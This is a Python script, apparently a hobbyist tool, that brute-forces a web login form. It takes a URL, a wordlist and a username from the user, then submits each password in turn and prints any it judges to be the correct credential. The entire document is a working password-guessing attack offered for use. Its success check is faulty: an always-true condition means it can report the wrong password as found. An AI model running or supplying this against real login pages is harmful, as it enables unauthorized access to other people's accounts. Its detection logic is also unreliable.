import requests
from colorama import Fore, init 
import time


init()

print("""              
                       ███████████████████████████
                       ███████▀▀▀░░░░░░░▀▀▀███████
                       ████▀░░░░░░░░░░░░░░░░░▀████
                       ███│░░░░░░░░░░░░░░░░░░░│███
                       ██▌│░░░░░░░░░░░░░░░░░░░│▐██
                       ██░└┐░░░░░░░░░░░░░░░░░┌┘░██
                       ██░░└┐░░░░░░░░░░░░░░░┌┘░░██
                       ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
                       ██▌░│██████▌░░░▐██████│░▐██
                       ███░│▐███▀▀░░▄░░▀▀███▌│░███
                       ██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
                       ██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
                       ████▄─┘██▌░░░░░░░▐██└─▄████
                       █████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
                       ████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
                       █████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
                       ███████▄░░░░░░░░░░░▄███████
                       ██████████▄▄▄▄▄▄▄██████████
                       ███████████████████████████

███████████████████████▀████████████████████████████████████████████████████████ 
█▄─█─▄█▄─▄█▄─▀█▄─▄█─▄▄▄▄█▄─█─▄███─▄▄▄▄█▄─▄▄─█─▄▄▄─█▄─██─▄█▄─▄▄▀█▄─▄█─▄─▄─█▄─█─▄█ 
██─▄▀███─███─█▄▀─██─██▄─██▄─▄████▄▄▄▄─██─▄█▀█─███▀██─██─███─▄─▄██─████─████▄─▄██ 
▀▄▄▀▄▄▀▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▀▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▀▄▄▄▄▀▀▄▄▀▄▄▀▄▄▄▀▀▄▄▄▀▀▀▄▄▄▀▀
""")


url = input("Enter the login page URL: ").strip()

password_wordlist = input("Enter the wordlist you would like to use: ").strip()

username = input("Enter the username to perform the brute-force attack against: ").strip()

response = requests.get(url)

print(Fore.GREEN + f"[+] Testing connection to {url}")

if response.status_code == 200:
 
  print(Fore.GREEN + f"[+] Connection to {url} successful!")
  
else:
     print(Fore.RED + f"[-] Failed to reach the URL provided. The status code is: {response.status_code}")
     exit(1)
     
         
with open(password_wordlist, "r") as file: 

    print(Fore.GREEN + f"[+] Attempting to brute-force user: {username}")
         

    
    for p in file.readlines():

         password = p.strip("\n")
         
         data = {"username": username, "password": password, "Login": 'submit'}

         req = requests.post(url, data=data)
      
         if req.status_code != 200:
         
           print(Fore.GREEN + f"[+] Attempting password: {password} Status code: {req.status_code}")
           
         elif "Redirecting" in req.text:
         
           print(Fore.YELLOW + f"[+] Attempting password: {password} (Login failed - Redirecting: {req.status_code})")  
           
           
         elif "Login failed" in req.text:
   
           print(Fore.YELLOW + f"[+] Attempting password: {password} (Login has failed)")
           
         elif "Welcome" or "Dashboard" in req.text:
         
           print(Fore.GREEN + f"[+] Password found for {username}: {password}")
           break
           
         elif "Success" or "302 Found" in req.text:
         
            print(Fore.GREEN + f"[+] Password found for {username}: {password}")
            break
          
         else:
             print(Fore.RED + "[+] Brute-force attack has finished.")  
      
         time.sleep(1) 
